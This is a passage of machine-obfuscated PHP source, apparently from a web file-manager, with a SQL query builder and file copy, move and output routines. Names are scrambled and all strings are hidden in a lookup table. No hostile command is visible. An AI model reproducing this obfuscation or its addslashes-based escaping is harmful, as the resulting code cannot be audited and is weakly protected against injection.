$c²‘ò–‰ç = $DÁøâ¸«[721]; unset($AŠÀªÉ©õê[$DÁøâ¸«[340]]); } else { $c²‘ò–‰ç = $DÁøâ¸«[722]; } foreach ($AŠÀªÉ©õê as $B†‚‚¼‰‘) { $Fª„ì»ÎºŞ[] = $c²‘ò–‰ç . (is_array($B†‚‚¼‰‘) ? $this->buildSelectSql($B†‚‚¼‰‘) : $B†‚‚¼‰‘); } return implode($DÁøâ¸«[50], $Fª„ì»ÎºŞ); } public function insert($aºˆï‘ìÄ®, $CÇ¶œé¾Š = array(), $b™¢¦…ŞŞ = false) { goto DéœÛˆ®Ì‡; b¢çè­ßÒ”: foreach ($aºˆï‘ìÄ® as $cèÁÛ¿¾ù => $FÇÆƒÛÖªë) { if (is_array($FÇÆƒÛÖªë) && $c«……ò¿Øß[289] == $FÇÆƒÛÖªë[0]) { $B…ßˆéïˆ[] = $this->parseKey($cèÁÛ¿¾ù); $F›ˆš²ë¼Ä[] = $FÇÆƒÛÖªë[1]; } elseif (is_scalar($FÇÆƒÛÖªë) || is_null($FÇÆƒÛÖªë)) { $B…ßˆéïˆ[] = $this->parseKey($cèÁÛ¿¾ù); $F›ˆš²ë¼Ä[] = $this->parseValue($FÇÆƒÛÖªë); } } $fØÏµ‚ÓÖµ = ($b™¢¦…ŞŞ ? $c«……ò¿Øß[584] : $c«……ò¿Øß[585]) . $c«……ò¿Øß[586] . $this->parseTable($CÇ¶œé¾Š[$c«……ò¿Øß[271]]) . $c«……ò¿Øß[580] . implode($c«……ò¿Øß[47], $B…ßˆéïˆ) . $c«……ò¿Øß[581] . implode($c«……ò¿Øß[47], $F›ˆš²ë¼Ä) . $c«……ò¿Øß[582]; $fØÏµ‚ÓÖµ .= $this->parseLock(isset($CÇ¶œé¾Š[$c«……ò¿Øß[538]]) ? $CÇ¶œé¾Š[$c«……ò¿Øß[538]] : !1); goto e¯³†£ó; DéœÛˆ®Ì‡: $c«……ò¿Øß =& $_SERVER[İë¬“ÅÒÛ›]; $F›ˆš²ë¼Ä = $B…ßˆéïˆ = array(); $this->model = $CÇ¶œé¾Š[$c«……ò¿Øß[273]]; goto b¢çè­ßÒ”; e¯³†£ó: $fØÏµ‚ÓÖµ .= $this->parseComment(!empty($CÇ¶œé¾Š[$c«……ò¿Øß[344]]) ? $CÇ¶œé¾Š[$c«……ò¿Øß[344]] : $c«……ò¿Øß[33]); return $this->execute($fØÏµ‚ÓÖµ, $this->parseBind(!empty($CÇ¶œé¾Š[$c«……ò¿Øß[277]]) ? $CÇ¶œé¾Š[$c«……ò¿Øß[277]] : array())); goto FÍÔÅï‘ç; FÍÔÅï‘ç: } public function selectInsert($a„õŒ¹å©ê, $BòÆ“áİÙç, $d›œ‚‰·Êİ = array()) { goto Aš–‘¾Ô˜›; CÀœ¶®óÛ: array_walk($a„õŒ¹å©ê, array($this, $e×—Áñ¹Œ[583])); $cÆ¼ãò»–© = $e×—Áñ¹Œ[723] . $this->parseTable($BòÆ“áİÙç) . $e×—Áñ¹Œ[580] . implode($e×—Áñ¹Œ[47], $a„õŒ¹å©ê) . $e×—Áñ¹Œ[702]; $cÆ¼ãò»–© .= $this->buildSelectSql($d›œ‚‰·Êİ); goto DŠ‹¸ÔÕš; Aš–‘¾Ô˜›: $e×—Áñ¹Œ =& $_SERVER[İë¬“ÅÒÛ›]; $this->model = $d›œ‚‰·Êİ[$e×—Áñ¹Œ[273]]; if (is_string($a„õŒ¹å©ê)) { $a„õŒ¹å©ê = explode($e×—Áñ¹Œ[47], $a„õŒ¹å©ê); } goto CÀœ¶®óÛ; DŠ‹¸ÔÕš: return $this->execute($cÆ¼ãò»–©, $this->parseBind(!empty($d›œ‚‰·Êİ[$e×—Áñ¹Œ[277]]) ? $d›œ‚‰·Êİ[$e×—Áñ¹Œ[277]] : array())); goto EŞÒ”Ÿ†ø; EŞÒ”Ÿ†ø: } public function update($B¢ÈÀÎ¹, $c¾³æÃ¾˜) { $A‘¿ê¨Â… =& $_SERVER[İë¬“ÅÒÛ›]; $this->model = $c¾³æÃ¾˜[$A‘¿ê¨Â…[273]]; $E‰ëºŒù›Í = $A‘¿ê¨Â…[724] . $this->parseTable($c¾³æÃ¾˜[$A‘¿ê¨Â…[271]]) . $this->parseSet($B¢ÈÀÎ¹) . $this->parseWhere(!empty($c¾³æÃ¾˜[$A‘¿ê¨Â…[267]]) ? $c¾³æÃ¾˜[$A‘¿ê¨Â…[267]] : $A‘¿ê¨Â…[33]) . $this->parseOrder(!empty($c¾³æÃ¾˜[$A‘¿ê¨Â…[353]]) ? $c¾³æÃ¾˜[$A‘¿ê¨Â…[353]] : $A‘¿ê¨Â…[33]) . $this->parseLimit(!empty($c¾³æÃ¾˜[$A‘¿ê¨Â…[284]]) ? $c¾³æÃ¾˜[$A‘¿ê¨Â…[284]] : $A‘¿ê¨Â…[33]) . $this->parseLock(isset($c¾³æÃ¾˜[$A‘¿ê¨Â…[538]]) ? $c¾³æÃ¾˜[$A‘¿ê¨Â…[538]] : !1) . $this->parseComment(!empty($c¾³æÃ¾˜[$A‘¿ê¨Â…[344]]) ? $c¾³æÃ¾˜[$A‘¿ê¨Â…[344]] : $A‘¿ê¨Â…[33]); return $this->execute($E‰ëºŒù›Í, $this->parseBind(!empty($c¾³æÃ¾˜[$A‘¿ê¨Â…[277]]) ? $c¾³æÃ¾˜[$A‘¿ê¨Â…[277]] : array())); } public function delete($eô¨ÄÖĞµŠ = array()) { $d°ĞŠó°ñ” =& $_SERVER[İë¬“ÅÒÛ›]; $this->model = $eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[273]]; $CÖˆßß± = $d°ĞŠó°ñ”[725] . $this->parseTable($eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[271]]) . $this->parseWhere(!empty($eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[267]]) ? $eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[267]] : $d°ĞŠó°ñ”[33]) . $this->parseOrder(!empty($eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[353]]) ? $eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[353]] : $d°ĞŠó°ñ”[33]) . $this->parseLimit(!empty($eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[284]]) ? $eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[284]] : $d°ĞŠó°ñ”[33]) . $this->parseLock(isset($eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[538]]) ? $eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[538]] : !1) . $this->parseComment(!empty($eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[344]]) ? $eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[344]] : $d°ĞŠó°ñ”[33]); return $this->execute($CÖˆßß±, $this->parseBind(!empty($eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[277]]) ? $eô¨ÄÖĞµŠ[$d°ĞŠó°ñ”[277]] : array())); } public function select($F”ğ‡Óğ• = array()) { goto Få£šªè‰§; fµãØÛ„óÏ: $aÕŠ‡æàß = isset($F”ğ‡Óğ•[$cãª–•´¸™[341]]) ? $F”ğ‡Óğ•[$cãª–•´¸™[341]] : !1; if ($aÕŠ‡æàß) { $BéÕ”à—Ö‘ = is_string($aÕŠ‡æàß[$cãª–•´¸™[88]]) ? $aÕŠ‡æàß[$cãª–•´¸™[88]] : $cãª–•´¸™[726] . md5($F‚íñ¼ˆ¾); $Dª—­Ó‘ÅÒ = think_cache($BéÕ”à—Ö‘, $cãª–•´¸™[33], $aÕŠ‡æàß); if (!1 !== $Dª—­Ó‘ÅÒ) { return $Dª—­Ó‘ÅÒ; } } $Fì¢·Î°¤„ = $this->query($F‚íñ¼ˆ¾, $this->parseBind(!empty($F”ğ‡Óğ•[$cãª–•´¸™[277]]) ? $F”ğ‡Óğ•[$cãª–•´¸™[277]] : array())); goto D³ñà ‹ˆ; D³ñà ‹ˆ: if ($aÕŠ‡æàß && !1 !== $Fì¢·Î°¤„) { think_cache($BéÕ”à—Ö‘, $Fì¢·Î°¤„, $aÕŠ‡æàß); } return $Fì¢·Î°¤„; goto E©¸“Êò²; Få£šªè‰§: $cãª–•´¸™ =& $_SERVER[İë¬“ÅÒÛ›]; $this->model = $F”ğ‡Óğ•[$cãª–•´¸™[273]]; $F‚íñ¼ˆ¾ = $this->buildSelectSql($F”ğ‡Óğ•); goto fµãØÛ„óÏ; E©¸“Êò²: } public function buildSelectSql($E¤æã‹İ“§ = array()) { goto bˆÂƒªòªĞ; bˆÂƒªòªĞ: $C§Ûêáâõ =& $_SERVER[İë¬“ÅÒÛ›]; if (isset($E¤æã‹İ“§[$C§Ûêáâõ[343]])) { if (strpos($E¤æã‹İ“§[$C§Ûêáâõ[343]], $C§Ûêáâõ[47])) { list($A·¥È ›¹, $C‚‰ÂÙ¸è—) = explode($C§Ûêáâõ[47], $E¤æã‹İ“§[$C§Ûêáâõ[343]]); } else { $A·¥È ›¹ = $E¤æã‹İ“§[$C§Ûêáâõ[343]]; } $A·¥È ›¹ = $A·¥È ›¹ ? $A·¥È ›¹ : 1; $C‚‰ÂÙ¸è— = isset($C‚‰ÂÙ¸è—) ? $C‚‰ÂÙ¸è— : (is_numeric($E¤æã‹İ“§[$C§Ûêáâõ[284]]) ? $E¤æã‹İ“§[$C§Ûêáâõ[284]] : 20); $BŒš›ò¨É¤ = $C‚‰ÂÙ¸è— * ((int) $A·¥È ›¹ - 1); $E¤æã‹İ“§[$C§Ûêáâõ[284]] = $BŒš›ò¨É¤ . $C§Ûêáâõ[47] . $C‚‰ÂÙ¸è—; } if (think_config($C§Ûêáâõ[727])) { $b½àæŸÄÂ = $C§Ûêáâõ[728] . md5(serialize($E¤æã‹İ“§)); $bÓ½÷Á¨Á = think_cache($b½àæŸÄÂ); if ($bÓ½÷Á¨Á) { return $bÓ½÷Á¨Á; } } goto D‹Ğã³ÛÚÔ; EøÉ‹ğ¼ùÑ: return $EÙó¬èËßŠ; goto CºÛÉ³Ç¼ô; D‹Ğã³ÛÚÔ: $EÙó¬èËßŠ = $this->parseSql($this->selectSql, $E¤æã‹İ“§); $EÙó¬èËßŠ .= $this->parseLock(isset($E¤æã‹İ“§[$C§Ûêáâõ[538]]) ? $E¤æã‹İ“§[$C§Ûêáâõ[538]] : !1); if (isset($b½àæŸÄÂ)) { think_cache($b½àæŸÄÂ, $EÙó¬èËßŠ); } goto EøÉ‹ğ¼ùÑ; CºÛÉ³Ç¼ô: } public function parseSql($fªñ¨˜‘, $A„®îöÀ› = array()) { $f´»Ú¸éù‡ =& $_SERVER[İë¬“ÅÒÛ›]; $fªñ¨˜‘ = str_replace(array($f´»Ú¸éù‡[729], $f´»Ú¸éù‡[730], $f´»Ú¸éù‡[731], $f´»Ú¸éù‡[732], $f´»Ú¸éù‡[733], $f´»Ú¸éù‡[734], $f´»Ú¸éù‡[735], $f´»Ú¸éù‡[736], $f´»Ú¸éù‡[737], $f´»Ú¸éù‡[738], $f´»Ú¸éù‡[739]), array($this->parseTable("{$A„®îöÀ›[$f´»Ú¸éù‡[271]]}"), $this->parseDistinct(isset($A„®îöÀ›[$f´»Ú¸éù‡[740]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[740]] : !1), $this->parseField(!empty($A„®îöÀ›[$f´»Ú¸éù‡[265]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[265]] : $f´»Ú¸éù‡[173]), $this->parseJoin(!empty($A„®îöÀ›[$f´»Ú¸éù‡[274]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[274]] : $f´»Ú¸éù‡[33]), $this->parseWhere(!empty($A„®îöÀ›[$f´»Ú¸éù‡[267]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[267]] : $f´»Ú¸éù‡[33]), $this->parseGroup(!empty($A„®îöÀ›[$f´»Ú¸éù‡[741]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[741]] : $f´»Ú¸éù‡[33]), $this->parseHaving(!empty($A„®îöÀ›[$f´»Ú¸éù‡[742]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[742]] : $f´»Ú¸éù‡[33]), $this->parseOrder(!empty($A„®îöÀ›[$f´»Ú¸éù‡[353]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[353]] : $f´»Ú¸éù‡[33]), $this->parseLimit(!empty($A„®îöÀ›[$f´»Ú¸éù‡[284]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[284]] : $f´»Ú¸éù‡[33]), $this->parseUnion(!empty($A„®îöÀ›[$f´»Ú¸éù‡[339]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[339]] : $f´»Ú¸éù‡[33]), $this->parseComment(!empty($A„®îöÀ›[$f´»Ú¸éù‡[344]]) ? $A„®îöÀ›[$f´»Ú¸éù‡[344]] : $f´»Ú¸éù‡[33])), $fªñ¨˜‘); return $fªñ¨˜‘; } public function getLastSql($bŒöˆ°‹óº = '') { return $bŒöˆ°‹óº ? $this->modelSql[$bŒöˆ°‹óº] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Bì¾ã»¹Ò) { return addslashes($Bì¾ã»¹Ò); } public function setModel($A±Õ‡ğ¸) { $this->model = $A±Õ‡ğ¸; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($eëîºÙ…­“, $eİ¶²©÷Ÿæ) { $B»µÖ­óò— = self::driverMake($eİ¶²©÷Ÿæ[0]); if (method_exists($B»µÖ­óò—, $eëîºÙ…­“)) { return @call_user_func_array(array($B»µÖ­óò—, $eëîºÙ…­“), $eİ¶²©÷Ÿæ); } if (method_exists($B»µÖ­óò—, $_SERVER[İë¬“ÅÒÛ›][743])) { return @call_user_func_array(array($B»µÖ­óò—, $eëîºÙ…­“), $eİ¶²©÷Ÿæ); } else { if (method_exists(self, $eëîºÙ…­“)) { return @call_user_func_array(array(self, $eëîºÙ…­“), $eİ¶²©÷Ÿæ); } else { call_user_func_array(array(parent, $eëîºÙ…­“), $eİ¶²©÷Ÿæ); } } } public static function init($f™°·î‡ê¶) { return self::driverMake($f™°·î‡ê¶); } public static function copy($bßÒìŒÒÓ, $C§ŒŒ±ˆËŒ, $cîªìëÏÛ = false) { return self::copyMove($bßÒìŒÒÓ, $C§ŒŒ±ˆËŒ, $cîªìëÏÛ, $_SERVER[İë¬“ÅÒÛ›][744]); } public static function move($c²†ê»Áåè, $e§çÂâØª, $E·ùÇ¤Ä×ª = false) { return self::copyMove($c²†ê»Áåè, $e§çÂâØª, $E·ùÇ¤Ä×ª, $_SERVER[İë¬“ÅÒÛ›][745]); } public static function saveFile($A®°İó»¸Œ, $C¬Å·îÉÃ–, $c”İÁ°¯å• = true) { goto aäË¯Ú™; cœ©ùšÇ¤™: $a‰»°å‹ˆ¨ = $f„½·öÄİ->pathFather($C¬Å·îÉÃ–); $a›æ¶ÓØÉã = !0; if (!$c”İÁ°¯å• && self::driverIsSame($c©¦×§˜Õ, $f„½·öÄİ)) { $a›æ¶ÓØÉã = !1; } goto aéÔÄ¸Ì»ğ; aäË¯Ú™: $FäŒâ˜‡ÁÌ =& $_SERVER[İë¬“ÅÒÛ›]; $BÍğ¡·ÍÛ¾ = self::info($C¬Å·îÉÃ–); $c©¦×§˜Õ = self::driverMake($A®°İó»¸Œ); goto eñ¶æÙ“; aéÔÄ¸Ì»ğ: $d”ˆ¤¹éá = self::copyFile($c©¦×§˜Õ, $A®°İó»¸Œ, $f„½·öÄİ, $a‰»°å‹ˆ¨, $BÍğ¡·ÍÛ¾[$FäŒâ˜‡ÁÌ[28]], $a›æ¶ÓØÉã); if ($eŸ„‹ŒŒ¯Ş) { $d”ˆ¤¹éá = $eŸ„‹ŒŒ¯Ş->getPathOuter($d”ˆ¤¹éá); } return $d”ˆ¤¹éá; goto E’Ñğ”¥; eñ¶æÙ“: $f„½·öÄİ = self::driverMake($C¬Å·îÉÃ–); $eŸ„‹ŒŒ¯Ş = !1; if ($f„½·öÄİ->pathParse[$FäŒâ˜‡ÁÌ[746]]) { $eÉíóë½‘ = $f„½·öÄİ->pathParse[$FäŒâ˜‡ÁÌ[746]]; $eŸ„‹ŒŒ¯Ş = $f„½·öÄİ; $f„½·öÄİ = self::driverMake($eÉíóë½‘); } goto cœ©ùšÇ¤™; E’Ñğ”¥: } private static function copyMove($c¦£·¦ôòÆ, $cåË¶¯Á°ï, $cÎ£®âÅ­«, $c¡»Ò¯Ü¤„) { goto cî¢Œ¼Õ‹–; c†¤˜ğ‘Á¬: $Dß£…‘ÂÍƒ = self::driverMake($cåË¶¯Á°ï); $a¦š½ë•¤Ë = $c¡»Ò¯Ü¤„ == $F–Ï¼ÙÉî[745]; $D¼´äØİà = !1; goto c­˜ÍåÊäÑ; c­˜ÍåÊäÑ: if ($Dß£…‘ÂÍƒ->pathParse[$F–Ï¼ÙÉî[746]]) { $cåË¶¯Á°ï = $Dß£…‘ÂÍƒ->pathParse[$F–Ï¼ÙÉî[746]]; $D¼´äØİà = $Dß£…‘ÂÍƒ; $Dß£…‘ÂÍƒ = self::driverMake($cåË¶¯Á°ï); } self::check($A§…Ú‹åê, $c¦£·¦ôòÆ, $Dß£…‘ÂÍƒ, $cåË¶¯Á°ï); Hook::trigger($F–Ï¼ÙÉî[73], $A§…Ú‹åê, $c¦£·¦ôòÆ, $Dß£…‘ÂÍƒ, $cåË¶¯Á°ï); goto d¬¡öÓÔ¼Ç; a±Ø±ãŠÄÖ: if (!$B¸¾œ»‚İ && $Dß£…‘ÂÍƒ->getType() == $F–Ï¼ÙÉî[452] && $A§…Ú‹åê->getType() == $F–Ï¼ÙÉî[102]) { $AéÁØÄã°§ = $Dß£…‘ÂÍƒ->copyFolderFromIO($A§…Ú‹åê, $c¦£·¦ôòÆ, $cåË¶¯Á°ï, $cÎ£®âÅ­«, $a¦š½ë•¤Ë); } else { $AéÁØÄã°§ = self::copyPath($A§…Ú‹åê, $c¦£·¦ôòÆ, $Dß£…‘ÂÍƒ, $cåË¶¯Á°ï, $cÎ£®âÅ­«, $a¦š½ë•¤Ë, $B¸¾œ»‚İ); } if ($AéÁØÄã°§ && $a¦š½ë•¤Ë) { $A§…Ú‹åê->remove($c¦£·¦ôòÆ); } if ($D¼´äØİà) { $AéÁØÄã°§ = $D¼´äØİà->getPathOuter($AéÁØÄã°§); } goto DôÎÁ®İĞ; DôÎÁ®İĞ: return $AéÁØÄã°§; goto D¶ñä†ÎŞÜ; cî¢Œ¼Õ‹–: $F–Ï¼ÙÉî =& $_SERVER[İë¬“ÅÒÛ›]; ignore_timeout(); $A§…Ú‹åê = self::driverMake($c¦£·¦ôòÆ); goto c†¤˜ğ‘Á¬; d¬¡öÓÔ¼Ç: $dùÛ¸ÍîÉ… = self::driverIsSame($A§…Ú‹åê, $Dß£…‘ÂÍƒ); if ($dùÛ¸ÍîÉ…) { if ($c¡»Ò¯Ü¤„ == $F–Ï¼ÙÉî[745] && trim($cåË¶¯Á°ï, $F–Ï¼ÙÉî[8]) == trim($Dß£…‘ÂÍƒ->pathFather($c¦£·¦ôòÆ), $F–Ï¼ÙÉî[8])) { return $Dß£…‘ÂÍƒ->getPathOuter($c¦£·¦ôòÆ); } if (method_exists($Dß£…‘ÂÍƒ, $c¡»Ò¯Ü¤„)) { return $Dß£…‘ÂÍƒ->{$c¡»Ò¯Ü¤„}($c¦£·¦ôòÆ, $cåË¶¯Á°ï, $cÎ£®âÅ­«); } } $B¸¾œ»‚İ = $A§…Ú‹åê->isFile($c¦£·¦ôòÆ); goto a±Ø±ãŠÄÖ; D¶ñä†ÎŞÜ: } private static function check($f—Äºâîàº, $C‚’˜‹ÀÎ, $Fø˜éìÎ, &$a¯°õÛé‹) { $cšÖ‡ÑÌì• =& $_SERVER[İë¬“ÅÒÛ›]; if (self::driverIsSame($f—Äºâîàº, $Fø˜éìÎ) && $f—Äºâîàº->isFolder($C‚’˜‹ÀÎ) && $f—Äºâîàº->isParentOf($C‚’˜‹ÀÎ, $a¯°õÛé‹)) { show_json(LNG($cšÖ‡ÑÌì•[747]), !1); } if (!$f—Äºâîàº->exist($C‚’˜‹ÀÎ)) { show_json(LNG($cšÖ‡ÑÌì•[101]), !1); } } private static function copyPath($D¾ÖË¡ÂŞ, $E«°Â™æËÖ, $eõ—Œ˜¦Ö, $AŒİë¾ÜéË, $AƒêÑÕ¹ä³, $e¤ƒ×”í‰Ÿ, $bÙË–¼í‚½) { goto eç¿­¼‘™; Dğ»æšõ¼Ô: if ($bÙË–¼í‚½) { if (!$eõ—Œ˜¦Ö->exist($AŒİë¾ÜéË)) { $bÙìš°‚ê = $eõ—Œ˜¦Ö->getPathName($eõ—Œ˜¦Ö->pathThis($AŒİë¾ÜéË)); $AŒİë¾ÜéË = $eõ—Œ˜¦Ö->pathFather($AŒİë¾ÜéË); } return self::copyFile($D¾ÖË¡ÂŞ, $E«°Â™æËÖ, $eõ—Œ˜¦Ö, $AŒİë¾ÜéË, $bÙìš°‚ê, $e¤ƒ×”í‰Ÿ); } if ($AƒêÑÕ¹ä³ == REPEAT_RENAME_FOLDER) { $AƒêÑÕ¹ä³ = !1; } $EñÆó£Ñ = rtrim($AŒİë¾ÜéË, $bäŠ”ßÜ[8]) . $bäŠ”ßÜ[8] . $bÙìš°‚ê; goto fäß¸é¼¼Õ; eç¿­¼‘™: $bäŠ”ßÜ =& $_SERVER[İë¬“ÅÒÛ›]; $bÙìš°‚ê = $D¾ÖË¡ÂŞ->getPathName($D¾ÖË¡ÂŞ->pathThis($E«°Â™æËÖ)); if ($AƒêÑÕ¹ä³) { $eòÇ¼†ÖŸ = $eõ—Œ˜¦Ö->fileNameExist($AŒİë¾ÜéË, $bÙìš°‚ê); $bÙìš°‚ê = $eõ—Œ˜¦Ö->fileNameAuto($AŒİë¾ÜéË, $bÙìš°‚ê, $AƒêÑÕ¹ä³, !$bÙË–¼í‚½); $AƒêÑÕ¹ä³ = $eòÇ¼†ÖŸ ? $AƒêÑÕ¹ä³ : !1; } goto Dğ»æšõ¼Ô; fäß¸é¼¼Õ: $AÉÖö¨‘ÇŠ = $eõ—Œ˜¦Ö->mkdir($eõ—Œ˜¦Ö->getPath($EñÆó£Ñ)); $AŒİë¾ÜéË = $eõ—Œ˜¦Ö->getPathInner($AÉÖö¨‘ÇŠ); $aìœ‹à³•ê = $D¾ÖË¡ÂŞ->listPath($E«°Â™æËÖ, !0); goto eòŞ–ªíÃƒ; eòŞ–ªíÃƒ: $d¸Î‘µöÛ = array_merge($aìœ‹à³•ê[$bäŠ”ßÜ[74]], $aìœ‹à³•ê[$bäŠ”ßÜ[75]]); foreach ($d¸Î‘µöÛ as $FÅÔ­ù¾­‹) { $f„ì‰‚×¤± = $FÅÔ­ù¾­‹[$bäŠ”ßÜ[29]] == $bäŠ”ßÜ[164]; $E«°Â™æËÖ = $D¾ÖË¡ÂŞ->getPathInner($FÅÔ­ù¾­‹[$bäŠ”ßÜ[76]]); $eİïâÚçÑÙ = self::copyPath($D¾ÖË¡ÂŞ, $E«°Â™æËÖ, $eõ—Œ˜¦Ö, $AŒİë¾ÜéË, $AƒêÑÕ¹ä³, $e¤ƒ×”í‰Ÿ, $f„ì‰‚×¤±); if (!$eİïâÚçÑÙ) { write_log($bäŠ”ßÜ[748] . $E«°Â™æËÖ . $bäŠ”ßÜ[749] . $AŒİë¾ÜéË, $bäŠ”ßÜ[750]); } } return $AÉÖö¨‘ÇŠ; goto d’İ¦¥®•â; d’İ¦¥®•â: } private static function copyFile($Dó„ùî¡†”, $c‘˜òÛß”, $bò¾³¥…Ê‚, $EÈ– »ƒ‚ï, $Eã–˜ˆ½Ş, $e¡ ¬«Ò) { goto b»˜ÀÑêÌŠ; b»˜ÀÑêÌŠ: $F¯„ºÛš… =& $_SERVER[İë¬“ÅÒÛ›]; $EÈ– »ƒ‚ï = $bò¾³¥…Ê‚->getPath(rtrim($EÈ– »ƒ‚ï, $F¯„ºÛš…[8]) . $F¯„ºÛš…[8] . $Eã–˜ˆ½Ş); $cìíÎ¶¤“ = $F¯„ºÛš…[751] . time() . rand_string(5); goto Eª¾ö©©–µ; EîìÅ©¿¶×: $cÀÚªîë÷É = $Dó„ùî¡†”->iconvApp($cÀÚªîë÷É); $FË—ğó—‡¨ = $bò¾³¥…Ê‚->upload($EÈ– »ƒ‚ï, $cÀÚªîë÷É, $e¡ ¬«Ò); del_file($AÊœä÷²ô» . $cìíÎ¶¤“); goto A–âõ°Â”é; DÃà§´×¢›: mk_dir($AÊœä÷²ô»); $cÀÚªîë÷É = $AÊœä÷²ô» . $cìíÎ¶¤“; $cÀÚªîë÷É = $Dó„ùî¡†”->download($c‘˜òÛß”, $cÀÚªîë÷É); goto EîìÅ©¿¶×; A–âõ°Â”é: Hook::trigger($F¯„ºÛš…[753], $Dó„ùî¡†”, $c‘˜òÛß”, $bò¾³¥…Ê‚, $EÈ– »ƒ‚ï, $Eã–˜ˆ½Ş, $FË—ğó—‡¨); return $FË—ğó—‡¨; goto B²¥Êéˆ­Ô; Eª¾ö©©–µ: Hook::trigger($F¯„ºÛš…[752], $Dó„ùî¡†”, $c‘˜òÛß”, $bò¾³¥…Ê‚, $EÈ– »ƒ‚ï, $Eã–˜ˆ½Ş, $cìíÎ¶¤“); if (self::driverIsSame($Dó„ùî¡†”, $bò¾³¥…Ê‚)) { if ($e¡ ¬«Ò) { $FË—ğó—‡¨ = $bò¾³¥…Ê‚->moveFile($c‘˜òÛß”, $EÈ– »ƒ‚ï); } else { $FË—ğó—‡¨ = $bò¾³¥…Ê‚->copyFile($c‘˜òÛß”, $EÈ– »ƒ‚ï); } Hook::trigger($F¯„ºÛš…[753], $Dó„ùî¡†”, $c‘˜òÛß”, $bò¾³¥…Ê‚, $EÈ– »ƒ‚ï, $Eã–˜ˆ½Ş, $FË—ğó—‡¨); return $FË—ğó—‡¨; } $AÊœä÷²ô» = TEMP_FILES; goto DÃà§´×¢›; B²¥Êéˆ­Ô: } public static function fileOut($BŒÆøÏÉŒ¡, $BĞ ™ˆô½ = false, $Aì†”Ş­³« = false, $c«’ÄÔ‹†Á = '') { $a‰æØŸ¨äÈ =& $_SERVER[İë¬“ÅÒÛ›]; $c í‹ê—à¤ = self::driverMake($BŒÆøÏÉŒ¡); $DÁÃ¹œ”Øº = $GLOBALS[$a‰æØŸ¨äÈ[6]][$a‰æØŸ¨äÈ[84]][$a‰æØŸ¨äÈ[754]]; if ($DÁÃ¹œ”Øº) { return $c í‹ê—à¤->fileOutServer($BŒÆøÏÉŒ¡, $BĞ ™ˆô½, $Aì†”Ş­³«, $c«’ÄÔ‹†Á); } return $c í‹ê—à¤->fileOut($BŒÆøÏÉŒ¡, $BĞ ™ˆô½, $Aì†”Ş­³«, $c«’ÄÔ‹†Á); } public function fileOutImage($F÷›·‘Í¯“, $E°çòòÑŒ„ = 250) { $aÉêäŒ¨ =& $_SERVER[İë¬“ÅÒÛ›]; $A“î´¦“… = self::driverMake($F÷›·‘Í¯“); $E„‹¸¸»Œ® = $GLOBALS[$aÉêäŒ¨[6]][$aÉêäŒ¨[84]][$aÉêäŒ¨[754]]; if ($E„‹¸¸»Œ®) { return $A“î´¦“…->fileOutImageServer($F÷›·‘Í¯“, $E°çòòÑŒ„); } return $A“î´¦“…->fileOutImage($F÷›·‘Í¯“, $E°çòòÑŒ„); } private static function driverIsSame($cÎ‹³œçÁ¼, $BÏ¨ƒÀà†·) { goto dÀìš÷Ş¦‰; dÀìš÷Ş¦‰: $aøµëõ×Š‰ =& $_SERVER[İë¬“ÅÒÛ›]; $B—Ä‹É»Ï = $cÎ‹³œçÁ¼->getType(); $cğÃ«Å›†Ò = $BÏ¨ƒÀà†·->getType(); goto fëç„ëëæŠ; a¨–ÉØ·ÀÆ: if ($cÎ‹³œçÁ¼->pathDriver == $BÏ¨ƒÀà†·->pathDriver) { return !0; } return !1; goto b­…¥È¯; fëç„ëëæŠ: if ($B—Ä‹É»Ï != $cğÃ«Å›†Ò) { return !1; } if ($B—Ä‹É»Ï == $aøµëõ×Š‰[452]) { return !0; } if ($B—Ä‹É»Ï == $aøµëõ×Š‰[102]) { return !0; } goto a¨–ÉØ·ÀÆ; b­…¥È¯: } public static function copyUpdate($côÑ¨øÂ‚Õ, $BÊ‘ ÖóŠ½) { goto E‚÷º×Çƒ; E‚÷º×Çƒ: $bŒÙ¨¶‰ =& $_SERVER[İë¬“ÅÒÛ›]; if (!IO::exist($côÑ¨øÂ‚Õ)) { return !1; } if (!IO::exist($BÊ‘ ÖóŠ½)) { IO::mkdir($BÊ‘ ÖóŠ½); } goto bÁŸô–‰˜; cªŞ¦ó“å—: Hook::trigger($bŒÙ¨¶‰[758], $côÑ¨øÂ‚Õ, $BÊ‘ ÖóŠ½, $e§‰ã®Ü‰); foreach ($B¼½ßóƒ‡Ù as $BŒš”ø–„) { IO::mkdir($BŒš”ø–„); } foreach ($eâÊæ‰§Î as $BŒš”ø–„) { IO::copy($BŒš”ø–„[$bŒÙ¨¶‰[755]], $BŒš”ø–„[$bŒÙ¨¶‰[756]], REPEAT_REPLACE); } goto dç¢áÓğ¬Ç; bÙ‰Ò“õ—: $B¼½ßóƒ‡Ù = array(); foreach ($AÑˆòõõÈ® as $F»†±Éç² => $BŒš”ø–„) { if ($BŒš”ø–„[$bŒÙ¨¶‰[77]] == 1 && !isset($c”òîáé‹œ[$F»†±Éç²])) { $B¼½ßóƒ‡Ù[] = $BÊ‘ ÖóŠ½ . $bŒÙ¨¶‰[8] . $F»†±Éç²; } if 